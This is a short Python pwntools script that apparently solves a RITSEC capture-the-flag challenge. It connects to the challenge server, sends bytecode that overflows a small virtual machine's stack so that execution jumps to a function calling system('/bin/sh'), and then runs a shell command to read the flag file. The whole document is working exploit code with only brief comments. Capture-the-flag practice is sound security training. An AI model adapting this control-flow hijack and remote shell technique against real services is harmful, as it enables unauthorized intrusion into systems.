#!/usr/bin/env python3
from pwn import *
import struct

HOST = "marauder-might.ctf.ritsec.club"
PORT = 1739

# fcn.00400780 -> system("/bin/sh")
WIN = 0x400780


def build_payload(n_push=260):
    # constants table for OP_CONSTANT idx
    consts = [0, WIN]
    header = struct.pack("<I", len(consts)) + b"".join(struct.pack("<Q", x) for x in consts)

    # VM bytecode in fcn.00400890:
    # 0x00 <idx>  => push constant[idx]
    # 0x01        => print(pop) and return
    bc = b"\x00\x00" * (n_push - 1) + b"\x00\x01" + b"\x01"
    return header + bc


def main():
    context.log_level = "info"
    io = remote(HOST, PORT)

    banner = io.recvline(timeout=1)
    log.info(f"banner: {banner!r}")

    io.send(build_payload())

    # consume printed double from OP_RETURN
    io.recvline(timeout=1)

    io.sendline(b"cat flag.txt 2>/dev/null || cat /flag* 2>/dev/null")
    flag = io.recvline(timeout=2)

    if flag:
        print(flag.decode(errors="ignore").strip())
    else:
        log.failure("No flag received")

    io.close()


if __name__ == "__main__":
    main()
